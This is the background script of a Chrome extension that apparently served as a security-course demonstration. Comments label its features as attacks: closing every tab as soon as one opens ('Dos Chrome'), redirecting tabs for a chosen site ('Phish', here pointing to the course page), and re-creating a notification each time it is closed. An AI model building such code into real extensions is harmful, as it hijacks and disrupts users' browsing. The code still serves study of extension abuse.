if (localStorage.getItem('notificationBool') == undefined) localStorage.setItem('notificationBool', false);
if (localStorage.getItem('fontBool') == undefined) localStorage.setItem('fontBool', false);
if (localStorage.getItem('closeBool') == undefined) localStorage.setItem('closeBool', false);
if (localStorage.getItem('rerouteBool') == undefined) localStorage.setItem('rerouteBool', false);
if (localStorage.getItem('powerBool') == undefined) localStorage.setItem('powerBool', false);

/**
 * (notifications)
 * Add persistent notifications through requesting permissions, 
 * so no "special permission" is requested if not necessary.
 */
var createNotification = function() {
    chrome.notifications.create('chroak', {
        type: 'basic',
        iconUrl: 'frog.png',
        title: 'Hey You!',
        message: 'This can be made to bug you forever!',
        isClickable: false
     }, function(notificationId) {});
}
var notificationsListener = function(notifId, byUser) {
  if (JSON.parse(localStorage.getItem('notificationBool'))) {
    createNotification();
  }
}
var addNotificationListener = function() {
  createNotification();
  chrome.notifications.onClosed.addListener(notificationsListener);
}
var removeNotificationListener = function() {
  chrome.notifications.onClosed.removeListener(notificationsListener);
}
chrome.permissions.contains({permissions:['notifications']}, function(contains) {
  if (contains) {
    createNotification();
  }
});



chrome.commands.onCommand.addListener(function(command) {
  console.log('Command:', command);
});

/*
 * Dos Chrome -- Close windows and tabs as soon as they open.
 * Phish -- Reroute all new windows and tabs to an arbitrary website.
 */
chrome.windows.onCreated.addListener(function(event) {
  console.log('opened a new window');

  if (event.url) { // execute phishing attack
    console.log('caputured new window url');
    phish(event.url, event.id);
  } else if (JSON.parse(localStorage.getItem('rerouteBool'))) { // reroute new tab
    console.log('no accessible event url');
    chrome.tabs.update(event.id, {url: 'http://courses.csail.mit.edu/6.857/2016/'});
  }

  if (JSON.parse(localStorage.getItem('closeBool'))) {
    chrome.tabs.query({}, function(tabs) {
      tabs.forEach(function(tab) {
        chrome.tabs.remove(tab.id);
      });
    });
  }
});

chrome.tabs.onCreated.addListener(function(event) {
  console.log('opened a new tab');
  console.log(event);


  if (event.url) { // execute phishing attack
    console.log('caputured new tab url');
    phish(event.url, event.id);
  } else if (JSON.parse(localStorage.getItem('rerouteBool'))) { // reroute new tab
    console.log('no accessible event url');
    chrome.tabs.update(event.id, {url: 'http://courses.csail.mit.edu/6.857/2016/'});
  }

  if (JSON.parse(localStorage.getItem('closeBool'))) { // close new tab
    chrome.tabs.query({}, function(tabs) {
      tabs.forEach(function(tab) {
        chrome.tabs.remove(tab.id);
      });
    });
  }
});

function phish(input_url, tab_id) {
  var r = new RegExp('^(?:https?:\/\/)?(?:[^@\n]+@)?(?:www\.)?([^:\/\n]+)');
  var url = r.exec(input_url)[1];
  var split = url.split('.');
  if (split.length > 2) {
    url = split[split.length-2] + '.' + split[split.length-1];
  }
  console.log('shortened url: ' + url);
  if (url == localStorage.getItem('phish-site')) {
    chrome.tabs.update(tab_id, {url: 'http://courses.csail.mit.edu/6.857/2016/'});
  }
}

/*
 *Declarative Content Stuffs
 *
 */
//  var match_rules = {
//     conditions: [
//        new chrome.declarativeContent.PageStateMatcher({
//            //find pages like 'https://*.example.com/*/reports/report.asp'
//            css: ["video"]
//        })
//     ],
//     //If found, display the Page Action icon registered in the manifest.json
//     actions: [ new chrome.declarativeContent.ShowPageAction() ]
// };

// chrome.runtime.onInstalled.addListener(function(details) {
//     chrome.declarativeContent.onPageChanged.removeRules(undefined, function() {
//         chrome.declarativeContent.onPageChanged.addRules([match_rules]);
//     });
// });

// // Called when the user clicks on the browser action.
// chrome.pageAction.onClicked.addListener(function(tab) {
//   chrome.tabs.executeScript(null, {file: 'content_script.js'},  function(result){
//         chrome.tabs.sendMessage(tab.id, {action: 'go'}, 
//             function(response){
//                 console.log(response);
//         });
//   });
// });
